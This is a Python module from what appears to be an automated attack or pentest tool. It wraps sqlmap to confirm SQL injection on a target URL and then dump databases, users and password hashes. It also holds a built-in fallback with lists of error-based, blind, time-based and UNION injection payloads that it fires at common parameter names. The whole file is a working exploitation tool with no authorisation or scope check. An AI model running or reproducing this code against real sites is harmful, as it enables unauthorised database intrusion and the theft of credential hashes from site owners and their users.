"""
SQLMap Runner
-------------
Wraps sqlmap for full SQLi exploitation.
When sqlmap is not installed → falls back to manual extraction probes.

Returns structured results:
  {
    "vulnerable": bool,
    "params": [...],
    "databases": [...],
    "tables": { db: [...] },
    "users": [...],
    "password_hashes": [...],
    "dumped_data": [...],
    "method": "sqlmap" | "builtin",
    "evidence": str,
  }
"""

import asyncio
import json
import os
import re
import tempfile
import logging
from urllib.parse import urlparse, urlencode, parse_qs, urljoin

import httpx

from core.tool_runner import is_available, run_tool

_log = logging.getLogger(__name__)

# ── Built-in SQLi error probes ─────────────────────────────────────────────────

_ERROR_PATTERNS = re.compile(
    r"(SQL syntax|mysql_fetch|ORA-\d{5}|SQLite3?::|"
    r"pg_query\(\)|PSQLException|"
    r"Microsoft OLE DB|Unclosed quotation|"
    r"syntax error.*?FROM|quoted string not properly terminated|"
    r"SQLSTATE\[|You have an error in your SQL)",
    re.I,
)

_BLIND_PAYLOADS = [
    ("' AND SLEEP(5)--", "time"),
    ("'; WAITFOR DELAY '0:0:5'--", "time"),   # MSSQL
    ("' AND 1=1--", "boolean_true"),
    ("' AND 1=2--", "boolean_false"),
    ("' OR '1'='1", "boolean_true"),
]

_UNION_PAYLOADS = [
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "' UNION SELECT 1,database(),3--",
    "' UNION SELECT 1,user(),3--",
    "' UNION SELECT 1,version(),3--",
]

_ERROR_PAYLOADS = ["'", "\"", "\\", "';", "\");", "' OR '1'='1", "1' OR '1'='1"]

# ── Common wordlist discovery paths ────────────────────────────────────────────

_PARAM_WORDLIST = [
    "id", "user_id", "item_id", "product_id", "order_id",
    "page", "search", "q", "query", "name", "username",
    "email", "token", "key", "cat", "category", "type",
    "sort", "filter", "limit", "offset",
]

# ── Helpers ────────────────────────────────────────────────────────────────────

def _parse_cookies(cookie_str: str) -> dict:
    result = {}
    for pair in (cookie_str or "").split(";"):
        pair = pair.strip()
        if "=" in pair:
            k, v = pair.split("=", 1)
            result[k.strip()] = v.strip()
    return result


async def _probe_param(client, url, param, value, timeout=6):
    """Probe a single parameter with a SQLi payload."""
    try:
        r = await client.get(url, params={param: value}, timeout=timeout)
        return r
    except Exception:
        return None


async def _test_error_based(client, url, param, log=None):
    """Test if param is error-based SQLi vulnerable."""
    for payload in _ERROR_PAYLOADS:
        r = await _probe_param(client, url, param, payload)
        if r and _ERROR_PATTERNS.search(r.text):
            return payload, r.text[:500]
    return None, None


async def _test_boolean_blind(client, url, param, baseline_len, log=None):
    """Test boolean-blind: TRUE response size ≠ FALSE response size."""
    r_true  = await _probe_param(client, url, param, "' AND 1=1--")
    r_false = await _probe_param(client, url, param, "' AND 1=2--")
    if r_true and r_false:
        diff = abs(len(r_true.content) - len(r_false.content))
        if diff > 50:
            return True, f"TRUE len={len(r_true.content)} FALSE len={len(r_false.content)} diff={diff}"
    return False, None


async def _test_time_based(client, url, param, log=None):
    """Test time-based blind: SLEEP(5) should delay response."""
    import time
    for payload, kind in _BLIND_PAYLOADS:
        if kind != "time":
            continue
        t0 = time.monotonic()
        r = await _probe_param(client, url, param, payload, timeout=12)
        elapsed = time.monotonic() - t0
        if r and elapsed >= 4.5:
            return True, f"SLEEP payload caused {elapsed:.1f}s delay"
    return False, None


async def _union_extract(client, url, param, log=None):
    """Attempt UNION-based data extraction."""
    extracted = []
    for payload in _UNION_PAYLOADS:
        r = await _probe_param(client, url, param, payload)
        if not r:
            continue
        text = r.text
        # look for version(), database(), user() output
        matches = re.findall(r'(\d+\.\d+\.\d+[\w.-]*|[a-zA-Z0-9_]+@[a-zA-Z0-9_]+)', text)
        if matches:
            extracted.extend(matches[:3])
    return list(set(extracted))


# ── Main entry via sqlmap ──────────────────────────────────────────────────────

async def _run_sqlmap(url, param, cookies="", auth_token="", log=None):
    """Run sqlmap on a specific parameter and return structured results."""
    def _log(msg):
        if log: log(msg)

    # Build cookie string for sqlmap
    cookie_arg = cookies or ""

    # Create output dir
    outdir = tempfile.mkdtemp(prefix="sqlmap_")

    cmd = [
        "sqlmap",
        "-u", url,
        "--batch",                  # no interactive prompts
        "--level=2",
        "--risk=1",
        "--dbs",                    # enumerate databases
        "--users",                  # enumerate users
        "--passwords",              # extract password hashes
        f"-p", param,
        "--output-dir", outdir,
        "--forms",
        "--crawl=1",
        "--timeout=10",
        "--retries=1",
    ]

    if cookie_arg:
        cmd += ["--cookie", cookie_arg]
    if auth_token:
        cmd += ["--headers", f"Authorization: Bearer {auth_token}"]

    _log(f"  sqlmap: {url} param={param}")
    try:
        stdout, stderr, rc = await run_tool(cmd, timeout=120)
    except Exception as e:
        _log(f"  sqlmap failed: {e}")
        return None

    # Parse sqlmap output
    result = {
        "vulnerable": False,
        "param": param,
        "databases": [],
        "users": [],
        "password_hashes": [],
        "evidence": stdout[:2000],
        "method": "sqlmap",
    }

    if rc == 0 or "is vulnerable" in stdout.lower() or "sqlmap identified" in stdout.lower():
        result["vulnerable"] = True
        _log(f"  sqlmap: VULNERABLE — {param}")

    # Extract DBs
    for m in re.finditer(r'\[\*\] (.+)', stdout):
        val = m.group(1).strip()
        if val not in ("starting", "ending", "shutting down"):
            result["databases"].append(val)

    # Extract users
    for m in re.finditer(r"database management system users \[(\d+)\].*?\n(.*?)(?=\n\n|\Z)", stdout, re.S):
        lines = m.group(2).splitlines()
        result["users"].extend([l.strip(" [*]'") for l in lines if l.strip()])

    # Extract password hashes
    for m in re.finditer(r"(\w+):\s+\$[^\s,]+", stdout):
        result["password_hashes"].append({"user": m.group(1), "hash": m.group(0)})

    return result


# ── Built-in fallback ──────────────────────────────────────────────────────────

async def _builtin_sqli(url, params_found, cookies="", auth_token="", log=None):
    """Built-in SQLi detection and limited extraction when sqlmap not available."""
    def _log(msg):
        if log: log(msg)

    cookie_dict = _parse_cookies(cookies)
    headers = {"User-Agent": "Mozilla/5.0 (compatible; SecurityScanner/1.0)"}
    if auth_token:
        headers["Authorization"] = f"Bearer {auth_token}"

    results = {
        "vulnerable": False,
        "vulnerable_params": [],
        "error_based": [],
        "blind_detected": [],
        "union_data": [],
        "method": "builtin",
    }

    async with httpx.AsyncClient(
        headers=headers, cookies=cookie_dict, verify=False,
        follow_redirects=True, timeout=15,
    ) as client:

        # First get baseline length
        try:
            base_r = await client.get(url, timeout=8)
            baseline_len = len(base_r.content)
        except Exception:
            baseline_len = None

        for param in (params_found or _PARAM_WORDLIST[:15]):
            _log(f"  בודק {param}…")

            # Error-based
            payload, evidence = await _test_error_based(client, url, param)
            if payload:
                _log(f"  ERROR-BASED SQLi: {param} → {payload}")
                results["vulnerable"] = True
                results["error_based"].append({"param": param, "payload": payload, "evidence": evidence})
                results["vulnerable_params"].append(param)

                # Try union extraction
                data = await _union_extract(client, url, param)
                if data:
                    results["union_data"].extend(data)
                continue

            # Boolean blind
            if baseline_len:
                blind, ev = await _test_boolean_blind(client, url, param, baseline_len)
                if blind:
                    _log(f"  BOOLEAN BLIND SQLi: {param}")
                    results["vulnerable"] = True
                    results["blind_detected"].append({"param": param, "evidence": ev})
                    results["vulnerable_params"].append(param)
                    continue

            # Time-based (last resort — slowest)
            time_vuln, ev = await _test_time_based(client, url, param)
            if time_vuln:
                _log(f"  TIME-BASED BLIND SQLi: {param}")
                results["vulnerable"] = True
                results["blind_detected"].append({"param": param, "evidence": ev, "type": "time"})
                results["vulnerable_params"].append(param)

    return results


# ── Entry point ────────────────────────────────────────────────────────────────

async def run_sqlmap_exploit(
    url: str,
    vulnerable_params: list = None,
    cookies: str = "",
    auth_token: str = "",
    log=None,
) -> dict:
    """
    Main entry point.
    If sqlmap is available → run sqlmap for full exploitation.
    Otherwise → built-in detection + limited extraction.
    """
    def _log(msg):
        if log: log(msg)

    url = url.rstrip("/")
    result = {
        "target": url,
        "vulnerable": False,
        "databases": [],
        "users": [],
        "password_hashes": [],
        "vulnerable_params": [],
        "union_data": [],
        "method": "none",
        "raw_results": [],
    }

    if is_available("sqlmap"):
        _log("SQLMap זמין — מריץ ניצול מלא...")
        params = vulnerable_params or _PARAM_WORDLIST[:10]
        for param in params[:5]:  # limit to 5 params to avoid timeout
            r = await _run_sqlmap(url, param, cookies, auth_token, log=_log)
            if r:
                result["raw_results"].append(r)
                if r.get("vulnerable"):
                    result["vulnerable"] = True
                    result["vulnerable_params"].append(param)
                    result["databases"].extend(r.get("databases", []))
                    result["users"].extend(r.get("users", []))
                    result["password_hashes"].extend(r.get("password_hashes", []))
        result["method"] = "sqlmap"
    else:
        _log("sqlmap לא מותקן — עובר למנגנון built-in...")
        r = await _builtin_sqli(url, vulnerable_params, cookies, auth_token, log=_log)
        result.update(r)
        result["method"] = "builtin"

    # Deduplicate
    result["databases"]       = list(dict.fromkeys(result.get("databases", [])))
    result["users"]           = list(dict.fromkeys(result.get("users", [])))
    result["vulnerable_params"] = list(dict.fromkeys(result.get("vulnerable_params", [])))

    return result
